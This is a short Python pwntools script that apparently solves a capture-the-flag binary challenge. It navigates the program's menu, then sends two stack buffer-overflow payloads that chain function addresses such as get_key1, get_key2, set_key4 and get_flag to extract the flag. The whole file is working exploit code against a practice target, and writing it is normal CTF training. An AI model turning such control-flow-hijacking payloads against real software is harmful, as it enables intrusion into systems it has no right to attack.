#!/usr/bin/env python3

from pwn import *

p = process('./challenge')
#p = remote('challenges.auctf.com', 30012)

p.recvuntil('choice: ')
p.sendline('2')
p.recvuntil('enter: ')
p.sendline('4')
p.recvuntil('choice: ')
p.sendline('3')
p.recvuntil('exit: ')
p.sendline('Stephen')
p.recvuntil('something: ')

baseproc = 0x56555000
binary = ELF('challenge')

payload  = 28 * b'A' 
payload += p32(baseproc + binary.symbols['AAsDrwEk'])
payload += p32(baseproc + binary.symbols['get_key2'])
payload += p32(baseproc + binary.symbols['get_key1'])
payload += p32(baseproc + binary.symbols['room4'])
payload += p32(0xfeedc0de)
p.sendline(payload)

p.recvuntil('something: ')

payload  = 28 * b'A' 
payload += p32(baseproc + binary.symbols['set_key4'])
payload += p32(baseproc + binary.symbols['get_flag'])
p.sendline(payload)

p.stream()

